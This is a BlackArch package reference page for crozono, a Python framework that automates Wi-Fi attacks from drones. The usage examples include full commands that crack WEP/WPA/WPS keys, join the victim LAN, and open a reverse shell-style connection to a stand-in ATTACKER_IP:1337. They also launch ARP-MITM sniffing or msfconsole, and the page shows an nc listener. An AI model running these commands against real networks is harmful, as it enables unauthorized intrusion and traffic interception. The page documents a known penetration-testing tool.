---
name: "crozono"
categories:
  - blackarch-drone
version: "5.6a51669"
homepage: "https://github.com/andy737/crozono-free"
packaged-by: [blackarch]
blackarch-builddate: "2026-01-12"
build-system: scripts
license: custom:unknown
meta-checked: "2026-11-09"
github-repo: "andy737/crozono-free"
github-status: "gone"
github-match: "exact"
gh-checked: "2026-11-09"
worth: 1.6
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-stars: 4
github-pushed: "2016-03-25"
github-archived: false
github-issues: 0
github-commits-year: 0
gh-activity-checked: "2026-11-09"
---

# crozono

> Automated Wi-Fi router penetration-testing chain: one command runs the airodump scan, WEP/WPA/WPS cracking, LAN join, nmap relay and post-exploitation.

*No corpus evidence — derived from upstream documentation.*

## What it's for

CROZONO (free version, andy737/crozono-free) is a Python framework built to automate the penetration testing of wireless networks from drones and other unconventional, portable devices. Given a monitor-capable interface it scans surrounding access points with airodump-ng, picks a target (automatically by captured IV count, or by ESSID), cracks WEP via aireplay-ng or WPA/WPA2 via reaver pixie-dust with fallback to the conventional handshake attack, then joins the LAN, requests an IP, and relays an `nmap -O -sV` sweep of the whole subnet back to the operator over a reverse TCP connection (port 1337) before optionally running an ARP-MITM sniffing attack (ettercap + tshark) or dropping into msfconsole. It needs root and the aircrack-ng suite, reaver/wash, nmap, ettercap and tshark installed. It is an attack orchestrator, not a new technique: every stage shells out to those standard tools, and without an attacker address (`-d`) it stops after joining the LAN.

## Typical use cases

### Hands-off crack of the strongest target

Let the framework survey the air and attack the most promising access point on its own.

```
sudo crozono -i wlan0
```

Outcome: puts the interface into monitor mode, runs airodump-ng for ~30 seconds, auto-selects the AP with the most captured IVs, runs the attack matching its security (WEP aireplay for ~300 s; WPS pixie-dust then handshake capture for WPA/WPA2), prints `Key found!: <key>` and saves it, then joins the LAN — and exits with `Attacker not defined!` because no `-d` was given.

### Full attack run against a named network

Point the whole chain at one ESSID and receive everything on your listener.

```
sudo crozono -i wlan0 -e "ExampleWiFi" -d ATTACKER_IP -a sniffing-mitm
```

Outcome: cracks ExampleWiFi, connects to its LAN, opens a reverse TCP connection to ATTACKER_IP:1337 with its stdin/stdout/stderr bound to it, streams an `nmap -O -sV` subnet scan, then ARP-MITMs a random LAN host with ettercap while tshark captures traffic on the interface. Attack values understood by `-a`: `sniffing-mitm` and `metasploit`.

### Skip cracking with a known key

Join a network you already have credentials for and go straight to post-exploitation.

```
sudo crozono -i wlan0 -e "ExampleWiFi" -k "Password1" -d ATTACKER_IP -a metasploit
```

Outcome: skips monitor mode and cracking entirely, associates with the ESSID using the supplied key, relays the nmap subnet sweep to ATTACKER_IP:1337, then launches `msfconsole` with its I/O attached to your connection.

### Catch the relay on the operator side

Receive the drone's reverse connection and streamed scan results.

```
nc -lvnp 1337
```

Outcome: accepts crozono's connection (default `PORT_ATTACKER = 1337`); the CROZONO banner, a `Hello! :)` log line and the live `nmap -O -sV` report appear in your terminal, and input you type is forwarded to the drone-side processes (msfconsole when `-a metasploit` was used).
